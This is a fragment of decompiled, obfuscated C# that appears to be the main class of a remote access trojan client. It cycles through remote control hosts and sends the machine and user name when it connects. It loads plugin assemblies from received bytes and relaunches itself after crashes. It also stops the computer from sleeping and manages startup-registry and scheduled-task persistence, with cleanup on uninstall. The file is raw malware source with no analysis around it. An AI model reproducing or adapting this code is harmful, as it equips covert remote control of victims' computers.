		catch (Exception exception_2)
		{
			Class8.smethod_86(exception_2, "DeleteAdminStartup");
		}
	}

	// Token: 0x06000095 RID: 149 RVA: 0x00005398 File Offset: 0x00003598
	private static bool smethod_56()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Class8.string_1, false);
			string a = Conversions.ToString(registryKey.GetValue(Class24.string_2, string.Empty));
			return string.Equals(a, Class8.string_2, StringComparison.InvariantCultureIgnoreCase);
		}
		catch (Exception exception_)
		{
			Class8.smethod_86(exception_, "CheckForAdminSetup");
		}
		return false;
	}

	// Token: 0x06000096 RID: 150 RVA: 0x00002537 File Offset: 0x00000737
	private static void smethod_57(object sender, UnhandledExceptionEventArgs e)
	{
		Class8.smethod_59((Exception)e.ExceptionObject);
	}

	// Token: 0x06000097 RID: 151 RVA: 0x00002549 File Offset: 0x00000749
	private static void smethod_58(object sender, ThreadExceptionEventArgs e)
	{
		Class8.smethod_59(e.Exception);
	}

	// Token: 0x06000098 RID: 152 RVA: 0x00005408 File Offset: 0x00003608
	private static void smethod_59(Exception exception_0)
	{
		try
		{
			Class8.smethod_86(exception_0, "HandleException");
		}
		catch (Exception ex)
		{
		}
		Class8.smethod_60(exception_0);
		try
		{
			Thread.Sleep(Class24.smethod_19());
			Process.Start(Application.ExecutablePath);
			Class8.smethod_42();
		}
		catch (Exception ex2)
		{
		}
	}

	// Token: 0x06000099 RID: 153 RVA: 0x00005478 File Offset: 0x00003678
	public static void smethod_60(Exception exception_0)
	{
		try
		{
			string text = Class26.smethod_6(exception_0);
			string str = BitConverter.ToString(Class27.smethod_1(text)).Replace("-", string.Empty).ToLower();
			string path = Path.Combine(Class24.string_1, str + ".dat");
			if (!File.Exists(path))
			{
				Directory.CreateDirectory(Class24.string_1);
				File.WriteAllBytes(path, Class22.smethod_1(new object[]
				{
					text
				}));
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x0600009A RID: 154 RVA: 0x0000550C File Offset: 0x0000370C
	public static string smethod_61(string string_4)
	{
		string path = Path.Combine(Class24.string_1, string_4 + ".dat");
		if (!File.Exists(path))
		{
			return string.Empty;
		}
		object[] array = Class22.smethod_2(File.ReadAllBytes(path));
		return (string)array[0];
	}

	// Token: 0x0600009B RID: 155 RVA: 0x00005554 File Offset: 0x00003754
	public static void smethod_62(string string_4)
	{
		try
		{
			string path = Path.Combine(Class24.string_1, string_4 + ".dat");
			File.Delete(path);
		}
		catch (Exception exception_)
		{
			Class8.smethod_86(exception_, "DeleteExceptionLog");
		}
	}

	// Token: 0x0600009C RID: 156 RVA: 0x000055A8 File Offset: 0x000037A8
	public static void smethod_63()
	{
		List<string> obj = Class8.list_3;
		lock (obj)
		{
			Class8.smethod_87("Rebuilding host cache..");
			Class8.int_0 = 0;
			Class8.int_1 = 0;
			Class8.list_3.Clear();
			Class8.smethod_64(Class24.smethod_4());
			Class8.smethod_64(Class24.smethod_5());
			if (Class8.byte_1 != null)
			{
				Class8.smethod_68();
			}
			int num = 0;
			int num2 = Class8.list_3.Count - 1;
			for (int i = num; i <= num2; i++)
			{
				Class8.smethod_87(string.Format("Host: {0}", Class8.list_3[i]));
			}
		}
	}

	// Token: 0x0600009D RID: 157 RVA: 0x00005650 File Offset: 0x00003850
	public static void smethod_64(string string_4)
	{
		List<string> obj = Class8.list_3;
		lock (obj)
		{
			if (!string.IsNullOrEmpty(string_4))
			{
				string item = string_4.Replace("*", string.Empty);
				if (!Class8.list_3.Contains(item))
				{
					Class8.list_3.Add(item);
				}
				int num = 0;
				do
				{
					item = string_4.Replace("*", Conversions.ToString(num));
					if (!Class8.list_3.Contains(item))
					{
						Class8.list_3.Add(item);
					}
					num++;
				}
				while (num <= 9);
			}
		}
	}

	// Token: 0x0600009E RID: 158 RVA: 0x000056F4 File Offset: 0x000038F4
	public static string smethod_65()
	{
		List<string> obj = Class8.list_3;
		string result;
		lock (obj)
		{
			result = Class8.list_3[Class8.int_0];
		}
		return result;
	}

	// Token: 0x0600009F RID: 159 RVA: 0x00005738 File Offset: 0x00003938
	private static void smethod_66(string string_4)
	{
		if (Class8.list_2 == null)
		{
			return;
		}
		try
		{
			foreach (GClass2 gclass in Class8.list_2)
			{
				if (gclass.gclass3_0 != null)
				{
					try
					{
						gclass.gclass3_0.method_0(string_4);
					}
					catch (Exception exception_)
					{
						Class8.smethod_85(gclass.gclass3_0, exception_, "VariableChanged");
					}
				}
			}
		}
		finally
		{
			List<GClass2>.Enumerator enumerator;
			((IDisposable)enumerator).Dispose();
		}
	}

	// Token: 0x060000A0 RID: 160 RVA: 0x000057CC File Offset: 0x000039CC
	private static void smethod_67(string string_4)
	{
		if (Class8.list_2 != null)
		{
			if (!Class8.bool_0)
			{
				return;
			}
			Class8.bool_1 = true;
			try
			{
				foreach (GClass2 gclass in Class8.list_2)
				{
					if (gclass.gclass3_0 != null)
					{
						try
						{
							gclass.gclass3_0.method_1(string_4);
						}
						catch (Exception exception_)
						{
							Class8.smethod_85(gclass.gclass3_0, exception_, "ClientSettingChanged");
						}
					}
				}
			}
			finally
			{
				List<GClass2>.Enumerator enumerator;
				((IDisposable)enumerator).Dispose();
			}
		}
	}

	// Token: 0x060000A1 RID: 161 RVA: 0x00005870 File Offset: 0x00003A70
	private static void smethod_68()
	{
		try
		{
			foreach (GClass2 gclass in Class8.list_2)
			{
				if (gclass.gclass3_0 != null)
				{
					try
					{
						gclass.gclass3_0.method_2();
					}
					catch (Exception exception_)
					{
						Class8.smethod_85(gclass.gclass3_0, exception_, "BuildingHostCache");
					}
				}
			}
		}
		finally
		{
			List<GClass2>.Enumerator enumerator;
			((IDisposable)enumerator).Dispose();
		}
	}

	// Token: 0x060000A2 RID: 162 RVA: 0x000058FC File Offset: 0x00003AFC
	private static Assembly smethod_69(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		try
		{
			if (resolveEventArgs_0.Name.StartsWith("ClientPlugin"))
			{
				if (Class8.assembly_0 == null)
				{
					Class8.assembly_0 = Assembly.Load(Class8.byte_1);
				}
				return Class8.assembly_0;
			}
		}
		catch (Exception exception_)
		{
			Class8.smethod_86(exception_, "AssemblyResolve");
		}
		return null;
	}

	// Token: 0x060000A3 RID: 163 RVA: 0x00002556 File Offset: 0x00000756
	private static void smethod_70(Client client_1, string string_4, IPAddress ipaddress_0)
	{
		Class8.smethod_87(string.Format("Resolved hostname '{0}' to '{1}'", string_4, ipaddress_0));
	}

	// Token: 0x060000A4 RID: 164 RVA: 0x00005968 File Offset: 0x00003B68
	private static void smethod_71(Client client_1)
	{
		if (Class8.list_2 != null)
		{
			try
			{
				foreach (GClass2 gclass in Class8.list_2)
				{
					if (gclass.gclass3_0 != null)
					{
						try
						{
							gclass.gclass3_0.method_3(client_1.method_33(), client_1.method_34());
						}
						catch (Exception exception_)
						{
							Class8.smethod_85(gclass.gclass3_0, exception_, "HostConnectFailed");
						}
					}
				}
			}
			finally
			{
				List<GClass2>.Enumerator enumerator;
				((IDisposable)enumerator).Dispose();
			}
		}
		Class8.smethod_74(true);
	}

	// Token: 0x060000A5 RID: 165 RVA: 0x00002569 File Offset: 0x00000769
	private static void smethod_72(Client client_1, Exception exception_0)
	{
		Class8.smethod_86(exception_0, string.Empty);
	}

	// Token: 0x060000A6 RID: 166 RVA: 0x00005A0C File Offset: 0x00003C0C
	private static void smethod_73(Client client_1, bool bool_6)
	{
		if (bool_6)
		{
			Class8.bool_4 = true;
			Class8.dateTime_2 = DateTime.Now.AddMinutes(5.0);
			Class8.smethod_87("Connection established.");
			Class20.smethod_6(Class24.guid_0, Environment.MachineName + "\\" + Environment.UserName, Class24.smethod_3(), Class24.smethod_1());
		}
		else
		{
			Class8.smethod_74(false);
			Class8.dateTime_2 = DateTime.MaxValue;
		}
	}

	// Token: 0x060000A7 RID: 167 RVA: 0x00005A84 File Offset: 0x00003C84
	private static void smethod_74(bool bool_6)
	{
		Class8.int_1++;
		if (Class8.int_1 == 3)
		{
			Class8.int_1 = 0;
			List<string> obj = Class8.list_3;
			lock (obj)
			{
				if (Class8.int_0 == Class8.list_3.Count - 1)
				{
					Class8.smethod_63();
				}
				else
				{
					Class8.int_0++;
				}
			}
		}
		if (!bool_6)
		{
			Class8.smethod_75(false);
		}
		if (Class8.bool_4)
		{
			Class8.bool_4 = false;
			Class8.smethod_87("Disconnected from remote host.");
		}
		if (Class8.dictionary_2 != null)
		{
			if (Class8.dictionary_2.Count != 0)
			{
				Class8.smethod_87(string.Format("Closing connection pipes..", Class8.dictionary_2.Count));
			}
			foreach (KeyValuePair<string, Client> keyValuePair in Class8.dictionary_2)
			{
				keyValuePair.Value.method_56();
			}
			Class8.dictionary_2.Clear();
		}
		ThreadPool.QueueUserWorkItem(delegate(object object_0)
		{
			delegate
			{
				Class8.smethod_43();
			}();
		});
	}

	// Token: 0x060000A8 RID: 168 RVA: 0x00005B90 File Offset: 0x00003D90
	public static void smethod_75(bool bool_6)
	{
		if (Class8.list_2 != null)
		{
			try
			{
				foreach (GClass2 gclass in Class8.list_2)
				{
					if (gclass.gclass3_0 != null)
					{
						try
						{
							gclass.gclass3_0.method_4(bool_6);
						}
						catch (Exception exception_)
						{
							Class8.smethod_85(gclass.gclass3_0, exception_, "HostStateChanged");
						}
					}
				}
			}
			finally
			{
				List<GClass2>.Enumerator enumerator;
				((IDisposable)enumerator).Dispose();
			}
		}
	}

	// Token: 0x060000A9 RID: 169 RVA: 0x00005C24 File Offset: 0x00003E24
	private static void smethod_76(Client client_1, byte[] byte_3)
	{
		GStruct2 gstruct2_ = Class22.smethod_4(byte_3);
		switch (gstruct2_.byte_0)
		{
		case 0:
			Class20.smethod_0(gstruct2_);
			break;
		case 1:
			Class5.smethod_0(gstruct2_);
			break;
		case 2:
			Class10.smethod_0(gstruct2_);
			break;
		}
	}

	// Token: 0x060000AA RID: 170 RVA: 0x00005C68 File Offset: 0x00003E68
	public static void smethod_77(Client client_1, byte[] byte_3)
	{
		GStruct2 gstruct2_ = Class22.smethod_4(byte_3);
		GClass3 gclass3_ = client_1.method_30().gclass3_0;
		try
		{
			if (gclass3_ == null)
			{
				Class8.smethod_84(client_1.method_30().string_0, gstruct2_);
			}
			else
			{
				gclass3_.method_7(client_1.method_30().string_0, gstruct2_.object_0);
			}
		}
		catch (Exception exception_)
		{
			string string_ = string.Format("ReadPacket [{0}]", client_1.method_30().string_0);
			if (gclass3_ == null)
			{
				Class8.smethod_86(exception_, string_);
			}
			else
			{
				Class8.smethod_85(gclass3_, exception_, string_);
			}
		}
	}

	// Token: 0x060000AB RID: 171 RVA: 0x00002576 File Offset: 0x00000776
	public static void smethod_78(Client client_1)
	{
		Class8.smethod_80(client_1);
	}

	// Token: 0x060000AC RID: 172 RVA: 0x00005D00 File Offset: 0x00003F00
	public static void smethod_79(Client client_1, bool bool_6)
	{
		GClass3 gclass3_ = client_1.method_30().gclass3_0;
		if (bool_6)
		{
			Class8.smethod_88(client_1, true, CommandType.BaseCommand, 2, new object[]
			{
				client_1.method_30().string_0,
				client_1.method_30().guid_0
			});
			try
			{
				if (gclass3_ == null)
				{
					Class8.smethod_82(client_1.method_30().string_0);
					return;
				}
				gclass3_.method_5(client_1.method_30().string_0);
				return;
			}
			catch (Exception exception_)
			{
				string string_ = string.Format("PipeCreated [{0}]", client_1.method_30().string_0);
				if (gclass3_ == null)
				{
					Class8.smethod_86(exception_, string_);
				}
				else
				{
					Class8.smethod_85(gclass3_, exception_, string_);
				}
				return;
			}
		}
		Class8.smethod_80(client_1);
	}

	// Token: 0x060000AD RID: 173 RVA: 0x00005DC8 File Offset: 0x00003FC8
	public static void smethod_80(Client client_1)
	{
		GClass3 gclass3_ = client_1.method_30().gclass3_0;
		try
		{
			if (gclass3_ == null)
			{
				Class8.smethod_83(client_1.method_30().string_0);
			}
			else
			{
				gclass3_.method_6(client_1.method_30().string_0);
			}
		}
		catch (Exception exception_)
		{
			string string_ = string.Format("PipeDestroyed [{0}]", client_1.method_30().string_0);
			if (gclass3_ == null)
			{
				Class8.smethod_86(exception_, string_);
			}
			else
			{
				Class8.smethod_85(gclass3_, exception_, string_);
			}
		}
		if (Class8.client_0.method_35())
		{
			Class8.dictionary_2.Remove(client_1.method_30().string_0);
		}
	}

	// Token: 0x060000AE RID: 174 RVA: 0x0000257E File Offset: 0x0000077E
	public static void smethod_81(Client client_1, Exception exception_0)
	{
		Class8.smethod_86(exception_0, string.Format("Pipe_ExceptionThrown [{0}]", client_1.method_30().string_0));
	}

	// Token: 0x060000AF RID: 175 RVA: 0x0000240E File Offset: 0x0000060E
	private static void smethod_82(string string_4)
	{
	}

	// Token: 0x060000B0 RID: 176 RVA: 0x0000240E File Offset: 0x0000060E
	private static void smethod_83(string string_4)
	{
	}

	// Token: 0x060000B1 RID: 177 RVA: 0x0000259B File Offset: 0x0000079B
	private static void smethod_84(string string_4, GStruct2 gstruct2_0)
	{
		if (Operators.CompareString(string_4, Class27.string_0, false) == 0)
		{
			Class10.smethod_0(gstruct2_0);
		}
	}

	// Token: 0x060000B2 RID: 178 RVA: 0x00005E74 File Offset: 0x00004074
	public static void smethod_85(GClass3 gclass3_0, Exception exception_0, string string_4)
	{
		Class8.smethod_87(string.Empty);
		Class8.smethod_87(string.Format("Plugin Exception [{0}] ({1}):", gclass3_0.string_0, string_4));
		Class8.smethod_87(string.Format("{0} {1}", exception_0.Message, exception_0.StackTrace));
		Class8.smethod_87(string.Empty);
	}

	// Token: 0x060000B3 RID: 179 RVA: 0x00005EC8 File Offset: 0x000040C8
	public static void smethod_86(Exception exception_0, string string_4)
	{
		Class8.smethod_87(string.Empty);
		Class8.smethod_87(string.Format("Client Exception ({0}):", string_4));
		Class8.smethod_87(string.Format("{0} {1}", exception_0.Message, exception_0.StackTrace));
		Class8.smethod_87(string.Empty);
	}

	// Token: 0x060000B4 RID: 180 RVA: 0x00005F14 File Offset: 0x00004114
	public static void smethod_87(string string_4)
	{
		if (Class8.bool_3 || Class8.bool_2)
		{
			string_4 = string_4.Trim();
			if (Class8.dateTime_1.Day != DateTime.Now.Day)
			{
				if (Class8.bool_3)
				{
					Class8.streamWriter_0.WriteLine();
					Class8.streamWriter_0.WriteLine(DateTime.Now.ToLongDateString());
					Class8.streamWriter_0.WriteLine();
				}
				if (Class8.bool_2)
				{
					Console.WriteLine();
					Console.WriteLine(DateTime.Now.ToLongDateString());
					Console.WriteLine();
				}
			}
			string value = string.Format("{0:t}: ", DateTime.Now);
			if (Class8.bool_3)
			{
				Class8.streamWriter_0.Write(value);
				Class8.streamWriter_0.WriteLine(string_4);
			}
			if (Class8.bool_2)
			{
				Console.Write(value);
				Console.WriteLine(string_4);
			}
			Class8.dateTime_1 = DateTime.Now;
		}
	}

	// Token: 0x060000B5 RID: 181 RVA: 0x00005FFC File Offset: 0x000041FC
	public static void smethod_88(Client client_1, bool bool_6, CommandType commandType_0, byte byte_3, object[] object_0)
	{
		Guid guid_;
		byte[] byte_4 = Class22.smethod_3(bool_6, (byte)commandType_0, byte_3, guid_, object_0);
		client_1.method_54(byte_4);
	}

	// Token: 0x060000B6 RID: 182 RVA: 0x0000601C File Offset: 0x0000421C
	public static void smethod_89(Client client_1, bool bool_6, CommandType commandType_0, byte byte_3, Guid guid_0, object[] object_0)
	{
		byte[] byte_4 = Class22.smethod_3(bool_6, (byte)commandType_0, byte_3, guid_0, object_0);
		client_1.method_54(byte_4);
	}

	// Token: 0x060000B7 RID: 183 RVA: 0x00006040 File Offset: 0x00004240
	public static void smethod_90(string string_4, bool bool_6, CommandType commandType_0, byte byte_3, object[] object_0)
	{
		if (Class8.dictionary_2.ContainsKey(string_4))
		{
			Client client_ = Class8.dictionary_2[string_4];
			Class8.smethod_88(client_, bool_6, commandType_0, byte_3, object_0);
		}
	}

	// Token: 0x060000B8 RID: 184 RVA: 0x00006074 File Offset: 0x00004274
	public static void smethod_91()
	{
		try
		{
			foreach (GClass2 gclass in Class8.list_2)
			{
				if (gclass.gclass3_0 != null)
				{
					try
					{
						gclass.gclass3_0.method_9();
					}
					catch (Exception exception_)
					{
						Class8.smethod_85(gclass.gclass3_0, exception_, "ClientUninstalling");
					}
				}
			}
		}
		finally
		{
			List<GClass2>.Enumerator enumerator;
			((IDisposable)enumerator).Dispose();
		}
		Class8.bool_3 = false;
		try
		{
			if (Class8.streamWriter_0 != null)
			{
				Class8.streamWriter_0.Close();
			}
		}
		catch (Exception ex)
		{
		}
		foreach (string path in Directory.GetFiles(Class24.string_0, "*", SearchOption.AllDirectories))
		{
			try
			{
				File.Delete(path);
			}
			catch (Exception ex2)
			{
			}
		}
		try
		{
			Directory.Delete(Class24.string_0, true);
		}
		catch (Exception ex3)
		{
		}
		Class8.smethod_53();
		Class8.smethod_55();
		Class8.smethod_49(Class24.string_2, 5000);
		Class8.smethod_49(Class24.string_2 + " Task", 5000);
	}

	// Token: 0x060000B9 RID: 185 RVA: 0x000061D8 File Offset: 0x000043D8
	public static void smethod_92()
	{
		try
		{
			Class8.bool_1 = false;
			Class8.smethod_87("Writing server settings..");
			List<object> list = new List<object>();
			foreach (KeyValuePair<string, object> keyValuePair in Class8.gclass6_1.GetEntries())
			{
				list.Add(keyValuePair.Key);
				list.Add(RuntimeHelpers.GetObjectValue(keyValuePair.Value));
				Class8.smethod_87(string.Format("{0} = {1}", keyValuePair.Key, RuntimeHelpers.GetObjectValue(keyValuePair.Value)));
			}
			byte[] bytes = Class22.smethod_1(list.ToArray());
			string text = Path.Combine(Class24.string_0, "settings.bin");
			string text2 = Path.Combine(Class24.string_0, "settings.bak");
			if (File.Exists(text))
			{
				File.Delete(text2);
				File.Copy(text, text2);
			}
			File.WriteAllBytes(text, bytes);
			File.Delete(text2);
		}
		catch (Exception exception_)
		{
			Class8.smethod_86(exception_, "SaveSettings");
		}
	}

	// Token: 0x060000BA RID: 186 RVA: 0x000062E8 File Offset: 0x000044E8
	public static void smethod_93(string string_4)
	{
		Class8.smethod_87(string.Format("Reading client settings from '{0}'..", string_4));
		try
		{
			Class8.gclass6_1.method_0();
			if (!File.Exists(Path.Combine(Class24.string_0, string_4)))
			{
				throw new Exception(string.Format("Settings file '{0}' could not be found.", string_4));
			}
			byte[] array = File.ReadAllBytes(Path.Combine(Class24.string_0, string_4));
			object[] array2 = Class22.smethod_2(array);
			int num = 0;
			int num2 = array2.Length - 1;
			for (int i = num; i <= num2; i += 2)
			{
				string arg = (string)array2[i];
				object objectValue = RuntimeHelpers.GetObjectValue(array2[i + 1]);
				Class8.gclass6_1.SetValue(arg, RuntimeHelpers.GetObjectValue(objectValue));
				Class8.smethod_87(string.Format("{0} = {1}", arg, RuntimeHelpers.GetObjectValue(objectValue)));
			}
		}
		catch (Exception exception_)
		{
			Class8.smethod_86(exception_, "LoadSettings");
			if (Operators.CompareString(string_4, "settings.bin", false) == 0)
			{
				Class8.smethod_93("settings.bak");
			}
		}
		Class8.bool_0 = true;
	}

	// Token: 0x060000BB RID: 187 RVA: 0x000063EC File Offset: 0x000045EC
	private static void smethod_94(object object_0)
	{
		DateTime now = DateTime.Now;
		if (Class8.bool_1)
		{
			Class8.smethod_92();
		}
		if (Class8.client_0 != null)
		{
			if (!Class8.client_0.method_35())
			{
				return;
			}
			if ((now - Class8.dateTime_3).TotalMilliseconds < (double)Class24.smethod_20())
			{
				return;
			}
			Class8.dateTime_3 = now;
			if ((now - Class8.dateTime_2).TotalMilliseconds >= (double)Class24.smethod_21())
			{
				Class8.client_0.method_56();
			}
			else
			{
				Class20.smethod_9();
			}
		}
	}

	// Token: 0x060000BC RID: 188 RVA: 0x00006470 File Offset: 0x00004670
	private static void smethod_95()
	{
		Thread.Sleep(20000);
		uint num = 2147483649u;
		if (Class24.smethod_15())
		{
			num |= 64u;
		}
		Class9.SetThreadExecutionState(num);
		Class8.smethod_95();
	}

	// Token: 0x0400002A RID: 42
	public static List<Guid> list_0;

	// Token: 0x0400002B RID: 43
	public static List<Guid> list_1;

	// Token: 0x0400002C RID: 44
	public static Dictionary<Guid, GStruct0> dictionary_0;

	// Token: 0x0400002D RID: 45
	public static Queue<string> queue_0;

	// Token: 0x0400002E RID: 46
	private static string string_0;

	// Token: 0x0400002F RID: 47
	private static string string_1;

	// Token: 0x04000030 RID: 48
	private static string string_2;

	// Token: 0x04000031 RID: 49
	private static string string_3;

	// Token: 0x04000032 RID: 50
	public static Dictionary<string, object> dictionary_1;

	// Token: 0x04000033 RID: 51
	public static bool bool_0;

	// Token: 0x04000034 RID: 52
	public static bool bool_1;

	// Token: 0x04000035 RID: 53
	private static Mutex mutex_0;

	// Token: 0x04000036 RID: 54
	public static byte[] byte_0;

	// Token: 0x04000037 RID: 55
	public static byte[] byte_1;

	// Token: 0x04000038 RID: 56
	public static DateTime dateTime_0;

	// Token: 0x04000039 RID: 57
	public static Dictionary<string, Client> dictionary_2;

	// Token: 0x0400003A RID: 58
	public static List<GClass2> list_2;

	// Token: 0x0400003B RID: 59
	public static GClass6 gclass6_0;

	// Token: 0x0400003C RID: 60
	public static GClass6 gclass6_1;

	// Token: 0x0400003D RID: 61
	public static GClass8 gclass8_0;

	// Token: 0x0400003E RID: 62
	private static DateTime dateTime_1;

	// Token: 0x0400003F RID: 63
	public static StreamWriter streamWriter_0;

	// Token: 0x04000040 RID: 64
	public static bool bool_2;

	// Token: 0x04000041 RID: 65
	public static bool bool_3;

	// Token: 0x04000042 RID: 66
	public static ClientLoaderForm clientLoaderForm_0;

	// Token: 0x04000043 RID: 67
	public static Client client_0;

	// Token: 0x04000044 RID: 68
	private static bool bool_4;

	// Token: 0x04000045 RID: 69
	public static byte[] byte_2;

	// Token: 0x04000046 RID: 70
	private static GClass5 gclass5_0;

	// Token: 0x04000047 RID: 71
	public static bool bool_5;

	// Token: 0x04000048 RID: 72
	private static long long_0;

	// Token: 0x04000049 RID: 73
	public static DateTime dateTime_2 = DateTime.MaxValue;

	// Token: 0x0400004A RID: 74
	public static List<string> list_3;

	// Token: 0x0400004B RID: 75
	public static int int_0;

	// Token: 0x0400004C RID: 76
	public static int int_1;

	// Token: 0x0400004D RID: 77
	private static Assembly assembly_0;

	// Token: 0x0400004E RID: 78
	private static DateTime dateTime_3;
}
